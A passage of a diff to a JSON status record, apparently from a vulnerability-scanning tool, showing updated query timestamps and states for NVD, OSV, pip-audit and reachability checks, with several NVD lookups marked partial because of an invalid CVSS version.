+      "attempted_at": "2026-11-07T22:25:51.947604Z",
       "diagnostic": "",
       "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
       "source": "nvd",
       "state": "ok"
     },
     {
-      "attempted_at": "2026-08-14T20:50:39.027195Z",
-      "diagnostic": "",
+      "attempted_at": "2026-11-07T22:25:52.830956Z",
+      "diagnostic": "NVD CVSS container version is invalid",
       "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
       "source": "nvd",
-      "state": "ok"
+      "state": "partial"
     },
     {
-      "attempted_at": "2026-08-14T20:50:31.532431Z",
+      "attempted_at": "2026-11-07T22:25:53.894476Z",
+      "diagnostic": "NVD CVSS container version is invalid",
+      "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
+      "source": "nvd",
+      "state": "partial"
+    },
+    {
+      "attempted_at": "2026-11-07T22:25:55.038462Z",
+      "diagnostic": "NVD CVSS container version is invalid",
+      "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
+      "source": "nvd",
+      "state": "partial"
+    },
+    {
+      "attempted_at": "2026-11-07T22:25:56.887977Z",
+      "diagnostic": "NVD CVSS container version is invalid",
+      "provenance": "https://services.nvd.nist.gov/rest/json/cves/2.0",
+      "source": "nvd",
+      "state": "partial"
+    },
+    {
+      "attempted_at": "2026-11-07T22:25:45.673512Z",
       "diagnostic": "",
       "provenance": "https://api.osv.dev/v1",
       "source": "osv",
       "state": "ok"
     },
     {
-      "attempted_at": "2026-08-14T20:50:32.607920Z",
+      "attempted_at": "2026-11-07T22:25:47.386719Z",
       "diagnostic": "ecosystem not present",
       "provenance": "",
       "source": "pip-audit",
       "state": "not_applicable"
+    },
+    {
+      "attempted_at": "2026-11-07T22:25:32.720460Z",
+      "diagnostic": "",
+      "provenance": "",
+      "source": "reachability",
+      "state": "ok"
     }
   ],
-  "timestamp": "2026-08-14T20:50:27.551491Z"
+  "timestamp": "2026-11-07T22:25:32.720460Z"
 }
